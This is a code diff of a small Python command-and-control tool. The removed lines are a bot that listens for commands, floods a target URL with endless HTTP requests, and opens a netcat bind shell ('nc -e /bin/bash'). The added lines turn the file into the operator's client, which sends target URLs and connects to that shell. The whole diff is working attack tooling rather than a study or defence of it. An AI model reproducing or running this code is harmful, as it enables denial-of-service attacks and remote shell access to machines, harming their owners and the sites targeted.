@@ -1,50 +1,31 @@
-import socket, os, requests, subprocess
+import socket, readline, os, subprocess
 
 ip = '10.9.1.23'
-port = 6666
+port = 6664
 
-def doz(url):
-	try:
-		while True:
-			r = requests.get(url)
-
-	except:
-		pass
-
-
-def c_listen():
-	
+def connection():
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.bind((ip, port))
-	s.listen(1)
-	con, adr = s.accept()
-	print(adr,' is connected!')
-	url = ''
+	s.connect((ip, port))
+	print('connected successfully!')
 
 	while True:
-		cmd = con.recv(1024).decode()
+		cmd = input('~# ')
 		if cmd == 'gg':
-			con.send(f'connection closed from {ip}'.encode())
-			con.close()
-			break
+			s.send('gg'.encode())
+			print(s.recv(1024).decode())
 		elif cmd == 'tar':
-			con.send('target loaded'.encode())
-			print(cmd)
-			con.close()
-		elif cmd == 'start':
-			doz(url)
+			ui = input('enter url: ')
+			s.send('tar'.encode())
+			s.send(ui.encode())
+		elif cmd == 'clear':
+			os.system('clear')
 		elif cmd == 'shell':
-			#con.send('shell command not working yet but you can do net bind shell ;)')
-			con.send('connected!'.encode())
-			os.system('nc -e /bin/bash -lvnp 9999 &')
-			#con.send('zhell'.encode())
-			#cmd = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
-			#con.send(cmd.stdout.read())
-			#con.send(cmd.stderr.read())
+			s.send('shell'.encode())
+			print(s.recv(1024).decode())
+			os.system(f'nc {ip} 9999')
 		else:
-			con.send('command not found!'.encode())
+			s.send(cmd.encode())
+			print(s.recv(1024).decode())
 
-	
 
-
-c_listen()
+connection()
